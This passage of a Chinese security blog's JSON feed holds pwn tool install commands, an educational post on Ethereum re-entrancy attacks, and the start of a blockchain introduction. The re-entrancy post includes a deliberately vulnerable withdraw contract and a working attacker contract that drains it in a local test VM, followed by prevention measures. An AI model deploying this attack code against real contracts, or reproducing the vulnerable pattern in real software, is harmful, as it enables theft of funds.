class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> ruby</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> gem</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> gem <span class=\"token function\">install</span> one_gadget</pre></td></tr></table></figure><h5 id=\"libcsearcher\"><a class=\"anchor\" href=\"#libcsearcher\">#</a> LibcSearcher</h5>\n<blockquote>\n<p>在开启地址随机化后，通过泄露某一个函数的地址偏移，利用 LibcSearcher 可以搜索到该程序使用的 libc 版本，从而计算出其他函数的地址。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/lieanu/LibcSearcher.git</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> LibcSearcher</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> python3 setup.py develop</pre></td></tr></table></figure><h5 id=\"seccomp-tools\"><a class=\"anchor\" href=\"#seccomp-tools\">#</a> seccomp-tools</h5>\n<blockquote>\n<p>用来读取 seccomp 沙箱规则。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> gcc ruby-dev</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> gem <span class=\"token function\">install</span> seccomp-tools</pre></td></tr></table></figure>",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://www.coldwinds.top/2021/12/Blockchain-ReEntrancy/",
            "url": "https://www.coldwinds.top/2021/12/Blockchain-ReEntrancy/",
            "title": "重入攻击",
            "date_published": "2021-12-11T11:56:34.000Z",
            "content_html": "<h1 id=\"重入攻击re-entrancy\"><a class=\"anchor\" href=\"#重入攻击re-entrancy\">#</a> 重入攻击（Re-Entrancy）</h1>\n<h2 id=\"前置\"><a class=\"anchor\" href=\"#前置\">#</a> 前置</h2>\n<h3 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h3>\n<blockquote>\n<p>​\t\t以太坊智能合约能够调用其他外部合约的代码。而这些合约通常也处理以太币，在调用外部合约时，会要求合约提交外部调用，这些外部调用就可以被攻击者劫持。</p>\n</blockquote>\n<blockquote>\n<p>​\t\t可以通过 fallback 回退函数使合约执行更多的代码，包括回调原合约本身。因此重入攻击有点像间接调用递归函数。</p>\n</blockquote>\n<blockquote>\n<p>​\t\t攻击合约可以回调合约上的一个函数，重新进入合约上的任意位置的代码并执行，如果没有防御措施，合约中的函数可能会被多次执行。</p>\n</blockquote>\n<h3 id=\"大致操作\"><a class=\"anchor\" href=\"#大致操作\">#</a> 大致操作</h3>\n<blockquote>\n<p>​\t\t攻击者在外部地址部署攻击合约，并在该合约写入包含 fallback 回退函数的恶意代码，当合约把以太币发送到该地址时，恶意代码会被激活，这些代码会在没有保护的合约上执行函数。</p>\n</blockquote>\n<h3 id=\"fallback回退函数\"><a class=\"anchor\" href=\"#fallback回退函数\">#</a> Fallback 回退函数</h3>\n<h4 id=\"fallback函数的定义\"><a class=\"anchor\" href=\"#fallback函数的定义\">#</a> fallback 函数的定义</h4>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 无函数名、无函数参数、无返回值</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 当要调用的函数找不到时就会触发对 fallback 函数的自动调用。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 由于 Solidity 中提供了编译期检查，所以不能直接通过 Solidity 调用一个不存在的函数。但可以使用 Solidity 的提供的底层函数 address.call 来模拟这一行为。</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">FallbackCalled</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"fallback函数的使用\"><a class=\"anchor\" href=\"#fallback函数的使用\">#</a> fallback 函数的使用</h4>\n<blockquote>\n<p>​\t\t使用 send () 函数向某个合约直接转账时，这个行为没有发送任何数据，所以接收合约<strong>总是</strong>会调用 fallback () 函数。</p>\n<p>​\t\t如果要在合约中通过 send () 函数接收以太币，就必须定义 fallback 函数（否则异常），且 fallback 函数必须添加关键字 payable（否则结果将为 false）。</p>\n<p>​\t\t发送以太币一方的合约中的 send () 函数可以不用定义 fallback 函数。</p>\n</blockquote>\n<h2 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h2>\n<h3 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h3>\n<p>​\t\t构造一个漏洞合约，用于存放一定数量的以太币。</p>\n<p>​\t\t同时构造一个攻击合约，用于窃取漏洞合约的以太币。</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 声明 solidity 版本</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.23</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 漏洞合约</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">theDAO</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> _credit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">event</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _who<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">event</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _who<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 存款函数，攻击合约攻击时会先存入一定金额</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        _credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">emit</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// 取款函数</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">//_credit 为账户在该合约的存款</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">//amount 是单次取款的金额</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// 关键漏洞函数</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            _credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> amount<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">emit</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">// 查询函数，查看账户在该合约中的存款</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">creditOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> _credit<span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">// 查询函数，查看该合约中的余额</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">checkBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">// 攻击合约</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attacker</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    theDAO <span class=\"token keyword\">public</span> _newDAO<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> times <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">Attacker</span><span class=\"token punctuation\">(</span>theDAO addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        _owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        _newDAO <span class=\"token operator\">=</span> addr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    \t<span class=\"token comment\">// 向漏洞合约存钱</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        _newDAO<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token comment\">// 从漏洞合约取钱</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        _newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">checkBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\">// 记录函数，记录 fallback 函数执行次数</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">times</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">return</span> times<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\">//fallback 回退函数</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    \ttimes <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        _newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"合约编译-部署与执行\"><a class=\"anchor\" href=\"#合约编译-部署与执行\">#</a> 合约编译、部署与执行</h3>\n<blockquote>\n<p>​\t\t合约的编译和部署在在线编译网站<span class=\"exturl\" data-url=\"aHR0cDovL3JlbWl4LmV0aGVyZXVtLm9yZw==\"> http://remix.ethereum.org</span> 上进行，也可以选择本地编译器 solc 进行。</p>\n</blockquote>\n<h4 id=\"编译合约\"><a class=\"anchor\" href=\"#编译合约\">#</a> 编译合约</h4>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/image-20210424121204202.png\" alt=\"\" /></p>\n<blockquote>\n<p>注意编译版本尽量与声明版本号一致。</p>\n</blockquote>\n<h4 id=\"部署合约\"><a class=\"anchor\" href=\"#部署合约\">#</a> 部署合约</h4>\n<p>​\t\t本次演示合约将部署在本地环境<strong> JavaScript VM</strong> 上。</p>\n<p>​\t\t首先部署漏洞合约 theDAO，部署完成后向合约转入一定金额。</p>\n<p>​\t\t接着部署<strong>攻击合约</strong>，在部署时输入<strong>漏洞合约</strong>的地址，并在部署时转入一定金额。</p>\n<blockquote>\n<p>​\t\t这里转账顺序与合约源码有关，有三种接受转账方式（部署转账、合约转账、直接转账），在编译前根据需求（安全性、便利性）灵活使用。</p>\n</blockquote>\n<h4 id=\"执行攻击\"><a class=\"anchor\" href=\"#执行攻击\">#</a> 执行攻击</h4>\n<ol>\n<li>先分别点击<strong>漏洞合约</strong>的 checkBalance 选项和<strong>攻击合约</strong>的 checkBalance 选项，确认攻击前两个合约内的金额数量。</li>\n<li>点击攻击合约的 attack 选项，对<strong>漏洞合约</strong>进行攻击。</li>\n<li>待攻击完成后，分别点击<strong>漏洞合约</strong>的 checkBalance 选项和<strong>攻击合约</strong>的 checkBalance 选项，确认攻击后两个合约内的金额数量。</li>\n<li>点击<strong>攻击合约</strong>的 times 选项，以<strong>攻击合约</strong>执行一次 fallback 回退函数为指标，查看攻击次数。</li>\n</ol>\n<h4 id=\"过程分析\"><a class=\"anchor\" href=\"#过程分析\">#</a> 过程分析</h4>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>攻击合约执行_newDAO<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>向漏洞合约转账<span class=\"token number\">10</span>wei，这时漏洞合约会记录攻击合约的存款为<span class=\"token number\">10</span>wei。其中sender是攻击合约地址，value是我们转入的金额。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span>攻击合约接着执行_newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>意图从漏洞合约中取出<span class=\"token number\">10</span>wei。这时漏洞合约会比较我们希望取出的金额和存款的金额，因为我们是存<span class=\"token number\">10</span>取<span class=\"token number\">10</span>，所以成功通过比较。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3.</span>这时会执行漏洞合约中的msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>使漏洞合约向攻击合约转账<span class=\"token number\">10</span>wei。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">4.</span>攻击合约接收到<span class=\"token number\">10</span>wei后执行fallback回退函数，从而执行_newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>继续从漏洞合约中取出<span class=\"token number\">10</span>wei。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">5.</span>因为在上一次取款中，漏洞合约执行msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>后因为回退函数跳转回withdraw的开头，并没有执行_credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">-=</span>amount<span class=\"token punctuation\">;</span>导致攻击合约在漏洞合约中的余额还是<span class=\"token number\">10</span>wei（尽管我们已经取走了<span class=\"token number\">10</span>wei），因此漏洞合约继续向攻击合约转账<span class=\"token number\">10</span>wei。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">6.</span>攻击合约会不断重复步骤<span class=\"token number\">4</span>和<span class=\"token number\">5</span>，直到gas达到该次交易的上限或者漏洞合约中的余额用尽。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">7.</span>这时才会继续往下执行_credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">-=</span>amount<span class=\"token punctuation\">;</span>让攻击合约在漏洞合约中的存款变为<span class=\"token number\">0</span>，然后结束合约的执行。</pre></td></tr></table></figure><h4 id=\"运行结果\"><a class=\"anchor\" href=\"#运行结果\">#</a> 运行结果</h4>\n<p>​\t\t攻击合约通过重入攻击，窃取了漏洞合约中大量以太币。</p>\n<h2 id=\"预防措施\"><a class=\"anchor\" href=\"#预防措施\">#</a> 预防措施</h2>\n<ol>\n<li>\n<p>在合约中，遇到向外部合约转账的情况时，使用 solidity 中内置的 transfer () 函数，而不是 call () 函数。</p>\n<p>transfer () 函数仅会发送 2300 Gas 给用于合约的外部调用，这不足以攻击合约反复重入原合约。</p>\n</li>\n<li>\n<p>确保所有改变状态变量的逻辑，都发生在以太币被发送出合约（或任何外部调用）之前。</p>\n<p>上面的合约之所以能被重入攻击，很大一部分原因在于漏洞合约在转账时是先转账，再对用户的余额数进行修改，这使得合约在被重入攻击时，用户的余额数一致不变。如果是先修改余额再转账，攻击合约在第一次重入取款函数时，就会因为余额不足而失败。</p>\n</li>\n<li>\n<p>引入互斥锁，添加一个状态变量，在合约代码执行期间锁定合约，使得代码执行完之前只能有一个线程执行函数，防止函数被重入调用。</p>\n</li>\n</ol>\n",
            "tags": [
                "Blockchain"
            ]
        },
        {
            "id": "https://www.coldwinds.top/2021/12/Blockchain-profiles/",
            "url": "https://www.coldwinds.top/2021/12/Blockchain-profiles/",
            "title": "区块链简介",
            "date_published": "2021-12-11T11:47:26.000Z",
            "content_html": "<h1 id=\"区块链简介\"><a class=\"anchor\" href=\"#区块链简介\">#</a> 区块链简介</h1>\n<h2 id=\"概念定义\"><a class=\"anchor\" href=\"#概念定义\">#</a> 概念定义</h2>\n<blockquote>\n<p>​\t\t区块链是<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODglODYlRTUlQjglODMlRTUlQkMlOEYvMTkyNzYyMzI=\">分布式</span>数据存储、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclODIlQjklRTUlQUYlQjklRTclODIlQjklRTQlQkMlQTAlRTglQkUlOTMvODQ5MTk1Ng==\">点对点传输</span>、共识机制、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEElQTAlRTUlQUYlODYlRTclQUUlOTclRTYlQjMlOTUvMjgxNjIxMw==\">加密算法</span>等计算机技术的新型应用模式。区块链（Blockchain），是<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQUYlOTQlRTclODklQjklRTUlQjglODEvNDE0MzY5MA==\">比特币</span>的一个重要概念，它本质上是一个<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEUlQkIlRTQlQjglQUQlRTUlQkYlODMlRTUlOEMlOTYvODcxOTUzMg==\">去中心化</span>的数据库，同时作为<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQUYlOTQlRTclODklQjklRTUlQjglODEvNDE0MzY5MA==\">比特币</span>的底层技术，是一串使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUYlODYlRTclQTAlODElRTUlQUQlQTYvNDgwMDAx\">密码学</span>方法相关联产生的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOTUlQjAlRTYlOEQlQUUlRTUlOUQlOTcvMTA3Njcy\">数据块</span>，每一个数据块中包含了一批次比特币网络交易的信息，用于验证其信息的有效性（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklOTglQjIlRTQlQkMlQUEvOTYzODU1MA==\">防伪</span>）和生成下一个区块。其具有去中心化、不可篡改、全程留痕、可以追溯、集体维护、公开透明等特点。</p>\n</blockquote>\n<h2 id=\"特点\"><a class=\"anchor\" href=\"#特点\">#</a> 特点</h2>\n<h3 id=\"去中心化\"><a class=\"anchor\" href=\"#去中心化\">#</a> 去中心化</h3>\n<p>​\t\t在一个分布有众多节点的系统中，每个节点都具有高度自治的特征。节点之间彼此可以自由连接，形成新的连接单元。任何一个节点都可能成为暂时的中心，实现点对点的直接连接。</p>\n<h3 id=\"不可篡改全程留痕可以追溯\"><a class=\"anchor\" href=\"#不可篡改全程留痕可以追溯\">#</a> 不可篡改 / 全程留痕 / 